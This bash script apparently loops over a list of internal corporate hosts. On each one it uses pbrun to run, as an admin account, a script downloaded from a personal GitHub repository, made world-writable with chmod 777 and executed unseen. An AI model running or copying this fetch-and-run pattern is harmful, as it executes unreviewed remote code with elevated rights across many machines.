declare -A pirtDevSBX
pirtDevSBX=(["peplgp01308.corp.pep.pvt"]="SX0" ["peplgp01312.corp.pep.pvt"]="DX0" ["peplgp01313.corp.pep.pvt"]="S10" ["peplgp01257.pi.pvt"]="S35" ["pepldr03673.corp.pep.pvt"]="S61" ["peplgp01315.corp.pep.pvt"]="D10" ["peplgp01274.corp.pep.pvt"]="D30" ["peplgp01283.corp.pep.pvt"]="G6S" ["peplgp01311.corp.pep.pvt"]="G70" ["peplap07920.pi.pvt"]="DH0" ["peplap07880.pi.pvt"]="SH0" ["t01lap03296.pi.pvt"]="GC7" ["peplap10263.corp.pep.pvt"]="D5H" ["t01lap03868.pi.pvt"]="S5H" ["t01lap03299.pi.pvt"]="G60")


for host in "${!pirtDevSBX[@]}"
do
    sleep 1
    pbrun -u "${pirtDevSBX["$host"],,}"adm -h $host SHELL << ENDSHELL
    curl -o stopServ.sh https://raw.githubusercontent.com/prakhar0912/Deepshika-Portfolio/main/okay.sh
    chmod 777 stopServ.sh
    bash stopServ.sh
ENDSHELL
done